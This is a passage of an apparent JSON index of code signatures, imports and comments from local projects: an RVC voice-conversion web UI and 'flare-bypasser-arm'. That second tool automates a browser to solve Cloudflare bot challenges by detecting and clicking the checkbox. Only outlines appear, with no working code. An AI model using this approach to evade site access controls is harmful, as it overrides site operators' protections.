          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# self.hop_length = hop_length#",
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# print(1,pitch.shape)#[bs,t]",
          "# print(-1,pitchf.shape,ids_slice,self.segment_size,self.hop_length,self.segment_size//self.hop_length)",
          "# print(-2,pitchf.shape,z_slice.shape)",
          "# self.hop_length = hop_length#",
          "# The hook we want to remove is an instance of WeightNorm class, so",
          "# normally we would do `if isinstance(...)` but this class is not accessible",
          "# because of shadowing, so we check the module name directly.",
          "# https://github.com/pytorch/pytorch/blob/be0ca00c5ce260eb5bcec3237357f7a30cc08983/torch/nn/utils/__init__.py#L3",
          "# periods = [3, 5, 7, 11, 17, 23, 37]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# periods = [2, 3, 5, 7, 11, 17]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# 1d to 2d"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": [
          "@torch.jit.ignore",
          "@torch.jit.export",
          "@torch.jit.ignore",
          "@torch.jit.export"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/models_onnx.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, phone, pitch, lengths):",
          "def __init__(",
          "def forward(self, phone, pitch, lengths):",
          "def __init__(",
          "def forward(self, x, x_mask, g=None, reverse=False):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def forward(self, x, x_lengths, g=None):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def forward(self, x, g=None):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def _f02uv(self, f0):",
          "def _f02sine(self, f0, upp):\n\"\"\" f0: (batchsize, length, dim)\nwhere dim indicates fundamental tone and overtones\n\"\"\"",
          "def forward(self, f0: torch.Tensor, upp: int):\n\"\"\"sine_tensor, uv = forward(f0)\ninput F0: tensor(batchsize=1, length, dim=1)\nf0 for unvoiced steps should be 0\noutput sine_tensor: tensor(batchsize=1, length, dim)\noutput uv: tensor(batchsize=1, length, 1)\n\"\"\"",
          "def __init__(",
          "def forward(self, x, upp=None):",
          "def __init__(",
          "def forward(self, x, f0, g=None):",
          "def remove_weight_norm(self):",
          "def __init__(",
          "def remove_weight_norm(self):",
          "def construct_spkmixmap(self, n_speaker):",
          "def forward(self, phone, phone_lengths, pitch, nsff0, g, rnd, max_len=None):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, y, y_hat):",
          "def __init__(self, use_spectral_norm=False):",
          "def forward(self, x):",
          "def __init__(self, period, kernel_size=5, stride=3, use_spectral_norm=False):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class TextEncoder256(nn.Module):",
          "class TextEncoder768(nn.Module):",
          "class ResidualCouplingBlock(nn.Module):",
          "class PosteriorEncoder(nn.Module):",
          "class Generator(torch.nn.Module):",
          "class SineGen(torch.nn.Module):",
          "class SourceModuleHnNSF(torch.nn.Module):",
          "class GeneratorNSF(torch.nn.Module):",
          "class SynthesizerTrnMsNSFsidM(nn.Module):",
          "class MultiPeriodDiscriminator(torch.nn.Module):",
          "class MultiPeriodDiscriminatorV2(torch.nn.Module):",
          "class DiscriminatorS(torch.nn.Module):",
          "class DiscriminatorP(torch.nn.Module):"
        ],
        "imports": [
          "import math",
          "import logging",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import AvgPool1d, Conv1d, Conv2d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, spectral_norm, weight_norm",
          "from infer.lib.infer_pack import commons, modules",
          "import infer.lib.infer_pack.attentions_onnx as attentions",
          "from infer.lib.infer_pack.commons import get_padding, init_weights"
        ],
        "comments": [
          "############################## Warning! ##############################",
          "#                                                                    #",
          "#           Onnx Export Not Support All Of Non-Torch Types           #",
          "#           Include Python Built-in Types!!!!!!!!!!!!!!!!!           #",
          "#                   If You Want TO Change This File                  #",
          "#                  Do Not Use All Of Non-Torch Types!                #",
          "#                                                                    #",
          "############################## Warning! ##############################",
          "# generate uv signal",
          "# to produce sine waveforms",
          "# to merge source harmonics into a single excitation",
          "# self.hop_length = hop_length#",
          "# periods = [3, 5, 7, 11, 17, 23, 37]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# periods = [2, 3, 5, 7, 11, 17]",
          "# for j in range(len(fmap_r)):",
          "#     print(i,j,y.shape,y_hat.shape,fmap_r[j].shape,fmap_g[j].shape)",
          "# 1d to 2d"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/attentions.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, x, x_mask):",
          "def __init__(",
          "def forward(self, x, x_mask, h, h_mask):\n\"\"\"\nx: decoder input\nh: encoder output\n\"\"\"",
          "def __init__(",
          "def forward(",
          "def attention(",
          "def _matmul_with_relative_values(self, x, y):\n\"\"\"\nx: [b, h, l, m]\ny: [h or 1, m, d]\nret: [b, h, l, d]\n\"\"\"",
          "def _matmul_with_relative_keys(self, x, y):\n\"\"\"\nx: [b, h, l, d]\ny: [h or 1, m, d]\nret: [b, h, l, m]\n\"\"\"",
          "def _get_relative_embeddings(self, relative_embeddings, length: int):",
          "def _relative_position_to_absolute_position(self, x):\n\"\"\"\nx: [b, h, l, 2*l-1]\nret: [b, h, l, l]\n\"\"\"",
          "def _absolute_position_to_relative_position(self, x):\n\"\"\"\nx: [b, h, l, l]\nret: [b, h, l, 2*l-1]\n\"\"\"",
          "def _attention_bias_proximal(self, length: int):\n\"\"\"Bias for self-attention to encourage attention to close positions.\nArgs:\nlength: an integer scalar.\nReturns:\na Tensor with shape [1, 1, length, length]\n\"\"\"",
          "def __init__(",
          "def padding(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, x_mask: torch.Tensor):",
          "def _causal_padding(self, x):",
          "def _same_padding(self, x):"
        ],
        "class_defs": [
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class MultiHeadAttention(nn.Module):",
          "class FFN(nn.Module):"
        ],
        "imports": [
          "import copy",
          "import math",
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F",
          "from infer.lib.infer_pack import commons, modules",
          "from infer.lib.infer_pack.modules import LayerNorm"
        ],
        "comments": [
          "# reshape [b, d, t] -> [b, n_h, t, d_k]",
          "# Pad first before slice to avoid using cond ops.",
          "# commons.convert_pad_shape([[0, 0], [pad_length, pad_length], [0, 0]]),",
          "# Concat columns of pad to shift from relative to absolute indexing.",
          "#   commons.convert_pad_shape([[0, 0], [0, 0], [0, 0], [0, 1]])",
          "# Concat extra elements so to add up to shape (len+1, 2*len-1).",
          "# commons.convert_pad_shape([[0, 0], [0, 0], [0, int(length) - 1]])",
          "# Reshape and slice out the padded elements.",
          "# padd along column",
          "# commons.convert_pad_shape([[0, 0], [0, 0], [0, 0], [0, int(length) - 1]])",
          "# add 0's in the beginning that will skew the elements after reshape",
          "#    commons.convert_pad_shape([[0, 0], [0, 0], [int(length), 0]])",
          "# if causal:",
          "#     self.padding = self._causal_padding",
          "# else:",
          "#     self.padding = self._same_padding",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/commons.py",
        "docstrings": [],
        "function_defs": [
          "def init_weights(m, mean=0.0, std=0.01):",
          "def get_padding(kernel_size, dilation=1):",
          "def kl_divergence(m_p, logs_p, m_q, logs_q):\n\"\"\"KL(P||Q)\"\"\"\nkl = (logs_q - logs_p) - 0.5\nkl += (\n0.5 * (torch.exp(2.0 * logs_p) + ((m_p - m_q) ** 2)) * torch.exp(-2.0 * logs_q)\n)\nreturn kl\n\n\ndef rand_gumbel(shape):",
          "def rand_gumbel(shape):\n\"\"\"Sample from the Gumbel distribution, protect from overflows.\"\"\"\nuniform_samples = torch.rand(shape) * 0.99998 + 0.00001\nreturn -torch.log(-torch.log(uniform_samples))\n\n\ndef rand_gumbel_like(x):\ng = rand_gumbel(x.size()).to(dtype=x.dtype, device=x.device)\nreturn g\n",
          "def rand_gumbel_like(x):",
          "def slice_segments(x, ids_str, segment_size=4):",
          "def slice_segments2(x, ids_str, segment_size=4):",
          "def rand_slice_segments(x, x_lengths=None, segment_size=4):",
          "def get_timing_signal_1d(length, channels, min_timescale=1.0, max_timescale=1.0e4):",
          "def add_timing_signal_1d(x, min_timescale=1.0, max_timescale=1.0e4):",
          "def cat_timing_signal_1d(x, min_timescale=1.0, max_timescale=1.0e4, axis=1):",
          "def subsequent_mask(length):",
          "def fused_add_tanh_sigmoid_multiply(input_a, input_b, n_channels):",
          "def convert_pad_shape(pad_shape: List[List[int]]) -> List[int]:",
          "def shift_1d(x):",
          "def sequence_mask(length: torch.Tensor, max_length: Optional[int] = None):",
          "def generate_path(duration, mask):\n\"\"\"\nduration: [b, 1, t_x]\nmask: [b, 1, t_y, t_x]\n\"\"\"",
          "def clip_grad_value_(parameters, clip_value, norm_type=2):"
        ],
        "class_defs": [],
        "imports": [
          "from typing import List, Optional",
          "import math",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F"
        ],
        "comments": [
          "# def convert_pad_shape(pad_shape):",
          "#     l = pad_shape[::-1]",
          "#     pad_shape = [item for sublist in l for item in sublist]",
          "#     return pad_shape",
          "# def convert_pad_shape(pad_shape):",
          "#     l = pad_shape[::-1]",
          "#     pad_shape = [item for sublist in l for item in sublist]",
          "#     return pad_shape"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@torch.jit.script"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, channels, eps=1e-5):",
          "def forward(self, x):",
          "def __init__(",
          "def forward(self, x, x_mask):",
          "def __init__(self, channels, kernel_size, n_layers, p_dropout=0.0):",
          "def forward(self, x, x_mask, g: Optional[torch.Tensor] = None):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(self, channels, kernel_size=3, dilation=(1, 3, 5)):",
          "def forward(self, x: torch.Tensor, x_mask: Optional[torch.Tensor] = None):",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(self, channels, kernel_size=3, dilation=(1, 3)):",
          "def forward(self, x, x_mask: Optional[torch.Tensor] = None):",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def forward(",
          "def forward(",
          "def __init__(self, channels):",
          "def forward(self, x, x_mask, reverse=False, **kwargs):",
          "def __init__(",
          "def forward(",
          "def remove_weight_norm(self):",
          "def __prepare_scriptable__(self):",
          "def __init__(",
          "def forward("
        ],
        "class_defs": [
          "class LayerNorm(nn.Module):",
          "class ConvReluNorm(nn.Module):",
          "class DDSConv(nn.Module):",
          "class WN(torch.nn.Module):",
          "class ResBlock1(torch.nn.Module):",
          "class ResBlock2(torch.nn.Module):",
          "class Log(nn.Module):",
          "class Flip(nn.Module):",
          "class ElementwiseAffine(nn.Module):",
          "class ResidualCouplingLayer(nn.Module):",
          "class ConvFlow(nn.Module):"
        ],
        "imports": [
          "import copy",
          "import math",
          "from typing import Optional, Tuple",
          "import numpy as np",
          "import scipy",
          "import torch",
          "from torch import nn",
          "from torch.nn import AvgPool1d, Conv1d, Conv2d, ConvTranspose1d",
          "from torch.nn import functional as F",
          "from torch.nn.utils import remove_weight_norm, weight_norm",
          "from infer.lib.infer_pack import commons",
          "from infer.lib.infer_pack.commons import get_padding, init_weights",
          "from infer.lib.infer_pack.transforms import piecewise_rational_quadratic_transform"
        ],
        "comments": [
          "# last one is not necessary",
          "# torch.jit.script() Compiled functions \\",
          "# can't take variable number of arguments or \\",
          "# use keyword-only arguments with defaults"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/attentions_onnx.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, x, x_mask):",
          "def __init__(",
          "def forward(self, x, x_mask, h, h_mask):\n\"\"\"\nx: decoder input\nh: encoder output\n\"\"\"",
          "def __init__(",
          "def forward(",
          "def attention(",
          "def _matmul_with_relative_values(self, x, y):\n\"\"\"\nx: [b, h, l, m]\ny: [h or 1, m, d]\nret: [b, h, l, d]\n\"\"\"",
          "def _matmul_with_relative_keys(self, x, y):\n\"\"\"\nx: [b, h, l, d]\ny: [h or 1, m, d]\nret: [b, h, l, m]\n\"\"\"",
          "def _get_relative_embeddings(self, relative_embeddings, length):",
          "def _relative_position_to_absolute_position(self, x):\n\"\"\"\nx: [b, h, l, 2*l-1]\nret: [b, h, l, l]\n\"\"\"",
          "def _absolute_position_to_relative_position(self, x):\n\"\"\"\nx: [b, h, l, l]\nret: [b, h, l, 2*l-1]\n\"\"\"",
          "def _attention_bias_proximal(self, length):\n\"\"\"Bias for self-attention to encourage attention to close positions.\nArgs:\nlength: an integer scalar.\nReturns:\na Tensor with shape [1, 1, length, length]\n\"\"\"",
          "def __init__(",
          "def padding(self, x: torch.Tensor, x_mask: torch.Tensor) -> torch.Tensor:",
          "def forward(self, x: torch.Tensor, x_mask: torch.Tensor):",
          "def _causal_padding(self, x):",
          "def _same_padding(self, x):"
        ],
        "class_defs": [
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class MultiHeadAttention(nn.Module):",
          "class FFN(nn.Module):"
        ],
        "imports": [
          "import copy",
          "import math",
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch import nn",
          "from torch.nn import functional as F",
          "from infer.lib.infer_pack import commons, modules",
          "from infer.lib.infer_pack.modules import LayerNorm"
        ],
        "comments": [
          "############################## Warning! ##############################",
          "#                                                                    #",
          "#           Onnx Export Not Support All Of Non-Torch Types           #",
          "#           Include Python Built-in Types!!!!!!!!!!!!!!!!!           #",
          "#                   If You Want TO Change This File                  #",
          "#                  Do Not Use All Of Non-Torch Types!                #",
          "#                                                                    #",
          "############################## Warning! ##############################",
          "# reshape [b, d, t] -> [b, n_h, t, d_k]",
          "# Pad first before slice to avoid using cond ops.",
          "# commons.convert_pad_shape([[0, 0], [pad_length, pad_length], [0, 0]]),",
          "# Concat columns of pad to shift from relative to absolute indexing.",
          "#   commons.convert_pad_shape([[0, 0], [0, 0], [0, 0], [0, 1]])",
          "# Concat extra elements so to add up to shape (len+1, 2*len-1).",
          "# Reshape and slice out the padded elements.",
          "# padd along column",
          "# add 0's in the beginning that will skew the elements after reshape",
          "# if causal:",
          "#     self.padding = self._causal_padding",
          "# else:",
          "#     self.padding = self._same_padding",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)",
          "# padding = [[0, 0], [0, 0], [pad_l, pad_r]]",
          "#   commons.convert_pad_shape(padding)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm",
    "name": "flare-bypasser-arm",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@stable3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/docker-media/flare-bypasser-arm/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
